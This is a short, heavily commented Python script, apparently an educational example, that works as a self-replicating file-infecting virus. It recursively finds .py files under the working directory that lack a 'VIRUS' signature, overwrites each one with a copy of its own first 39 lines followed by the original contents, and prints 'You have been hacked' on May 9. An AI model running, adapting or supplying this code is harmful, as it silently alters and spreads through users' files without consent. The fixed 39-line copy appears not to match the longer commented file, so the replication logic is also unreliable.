#!/usr/bin/python3
import os            # imports os module 
import datetime      # imports datetime module 
SIGNATURE = "VIRUS"     # create the variable "signiture"
        # Function called locate that returns a list of python files that do not contain
        # the virus signiture by recursively searching all directories for python files and if the have the signiture
def locate(path):       # starts to define the function "locate" that takes a argument "path"
    files_targeted = []     # creates empty list named "files_targeted"
    filelist = os.listdir(path)     # uses the os module to get list of all files and directories in the "path" directory
    for fname in filelist:      # goes through each item in "filelist" and assigns the variable "fname" each time
        if os.path.isdir(path+"/"+fname):       # checks if current "fname" is a directory, if so it enters the code under the "if" statement
            files_targeted.extend(locate(path+"/"+fname))       # calls "locate" recuresively on the directory found and appends the returned list of infected files to the "files_targeted" list
        elif fname[-3:] == ".py":       # checks if current "fname" has the .py extension, if so it enters the code under the "elif" statement
            infected = False        # sets a boolean variable named "infected" to False
            for line in open(path+"/"+fname):   # open "fname" located in "path" and writeing over each line in the file
                if SIGNATURE in line:       # checks for "SIGNATURE" string in the current line of the file
                    infected = True     # sets "infected" variable to True
                    break       # breaks out of loop started 2 lines up
            if infected == False:       # checks "infected" variable to see if it is still falfe after checking all the lines, if so it enters it into the "it" statement
                files_targeted.append(path+"/"+fname)       # appends the path of the current file to the "files_targeted" list if it's not infected
    return files_targeted       # ends the loop and the function, and returns the final "files_targeted" list containing the paths of all uninfected ".py" files in the given "path" directory and its subdirectories.
        # Function called infect that takes the list from locate and infects them with the virus
def infect(files_targeted):     # Starts to define the "infect" function that takes the argument "files_targeted"
    virus = open(os.path.abspath(__file__))     # opens current file useing the os module and assigns it to a variable "virus"
    virusstring = ""        # creates an empty string named "virusstring" to store the contents of the virus file.
    for i,line in enumerate(virus):     # starts a loop that goes through each line of the virus file, assigning the line number to the variable "i" and the line content to the variable "line" every time.
        if 0 <= i < 39:     # checks if the current line number is between 0 and 38
            virusstring += line     # appends the current line to the "virusstring" variable if it is one of the first 39 lines.
    virus.close     # closes the virus file after reading its contents.
    for fname in files_targeted:        # starts a loop that iterates through each filename in the "files_targeted" list.
        f = open(fname)     # open current file
        temp = f.read()     # read the contents to a string variable "temp"
        f.close()       # close the file
        f = open(fname,"w")     # opens current file again in write mode
        f.write(virusstring + temp)     # writes the virus code "virusstring" followed by the original contents of the file "temp"
        f.close()       # closes the file
        # Function called detonate that checks the current date and prints
        # "You have been hacked" if it is May 9th
def detonate():     # starts to define the "detonate" function with no arguments
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:     # hecks if the current month is May and the current day is the 9th.
        print("You have been hacked")       # prints "you have been hacked"
        # Main code - calls "locate" with the path to the current directory, which give a list 
        # of files to infect. Then calls "Infect" with the list, infecting each file.
        # Then calls "detonate" to check the date and print the message if its May 9th
files_targeted = locate(os.path.abspath(""))        # This line calls the "locate" function with an absolute path to the current working directory, the function returns a list of filenames that are assigned to the variable "files_targeted".
infect(files_targeted)      # calls the "infect" function with the argument "files_targeted" then modifies the contents of each file in the list by adding virus code to the beginning of the file.
detonate()      # calls the "detonate" function, which checks if the current date is May 9th and prints a message to the console if it is